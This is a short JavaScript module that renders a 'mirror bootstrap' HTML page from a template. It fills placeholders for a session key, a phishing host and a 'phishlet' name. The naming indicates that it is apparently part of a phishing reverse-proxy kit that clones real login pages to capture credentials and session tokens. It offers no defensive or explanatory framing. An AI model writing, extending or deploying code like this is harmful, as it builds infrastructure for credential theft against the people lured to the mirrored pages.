import { readFileSync } from 'fs';
import { getMirrorShellPath } from './mirror-engine.js';
import { MIRROR_BUILD_ID } from './build-id.js';

export function renderMirrorBootstrapHtml({ sessionKey, phishHost, phishletName } = {}) {
  const template = readFileSync(getMirrorShellPath(), 'utf8');
  return template
    .replaceAll('__SESSION_KEY__', sessionKey || '')
    .replaceAll('__PHISH_HOST__', phishHost || '')
    .replaceAll('__PHISHLET_NAME__', phishletName || '')
    .replace('</head>', `<!-- pf-mirror-build:${MIRROR_BUILD_ID} -->\n</head>`);
}
